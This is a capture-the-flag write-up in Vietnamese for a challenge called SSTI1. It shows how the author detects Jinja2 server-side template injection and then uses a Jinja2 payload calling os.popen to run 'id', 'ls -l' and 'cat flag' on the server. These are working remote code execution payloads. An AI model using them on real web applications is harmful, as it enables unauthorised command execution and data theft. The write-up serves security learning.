## SSTI1
Description
I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website here!
-->Truy cập vào link web, nó dẫn ta tới web:
![image](https://hackmd.io/_uploads/BJIr4Ot3lg.png)

--> Đây là một trang web in ra thứ ta nhập vào, ví dụ khi ta yêu cầu nó in ra `disconmess` thì nó sẽ ra: disconmess
Ngoài ra , có vẻ nó cũng làm được toán . Ta có thể kiểm thử xem backend nó chạy ngôn ngữ gì bằng bản kiểm ở dưới đây: 

![image](https://hackmd.io/_uploads/ByzLM_F2lx.png)
Khi ta kiểm như trên bản ( nhập ``{{7*7}}`` ra `49` và ``{{7*'7'}}`` ra `7777777` ) 
--> Đây là Jinja2 chạy Backend
Ta search google  `SSTI Jinja2-payloads` thì được kết quả này: 
`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
Ta nhập payload này vào với lệnh `ls -l`
`{{request.application.__globals__.__builtins__.__import__('os').popen('ls -l').read()}}`
![image](https://hackmd.io/_uploads/ryTjmdYnlx.png)
`{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}`
![image](https://hackmd.io/_uploads/ByhAmdK3xl.png)
